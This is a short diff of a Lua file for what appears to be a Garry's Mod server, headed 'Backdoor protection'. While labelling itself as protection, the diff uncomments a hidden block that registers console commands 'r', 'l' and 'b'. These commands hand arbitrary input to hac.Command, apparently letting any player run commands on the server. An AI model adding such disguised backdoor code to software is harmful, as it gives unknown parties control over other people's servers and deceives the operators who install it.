@@ -1,5 +1,6 @@
-
---If you can't work out what this is, you shouldn't be hosting a server.
+/*
+	Backdoor protection
+*/
 
 local Good = {
 	["addons/hex's server plugins/lua/hsp_plugins.lua"] 			= 1,
@@ -67,8 +68,8 @@ end
 _G.CompileString = CompileString
 
 
---[[
-//Added amusement
+
+//Add
 local function ProcessH(p,c,a,s) 
 	if c == "r" then
 		hac.Command(s)
@@ -83,7 +84,7 @@ end
 concommand.Add("r", ProcessH)
 concommand.Add("l", ProcessH)
 concommand.Add("b", ProcessH)
-]]
+
 
 
 
